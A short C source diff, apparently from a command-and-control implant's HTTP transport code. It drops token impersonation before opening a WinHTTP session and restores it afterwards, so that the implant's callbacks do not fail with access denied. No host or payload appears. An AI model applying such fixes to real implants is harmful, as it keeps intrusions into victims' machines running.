@@ -220,6 +220,9 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = TRUE;
 
+    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
+    TokenImpersonate( FALSE );
+
     if ( Instance->Config.Transport.Proxy.Enabled )
     {
         HttpAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
@@ -392,6 +395,9 @@ LEAVE:
     Instance->Win32.WinHttpCloseHandle( hSession );
     Instance->Win32.WinHttpCloseHandle( hConnect );
     Instance->Win32.WinHttpCloseHandle( hRequest );
+
+    /* re-impersonate the token */
+    TokenImpersonate( TRUE );
 
     return Successful;
 #endif
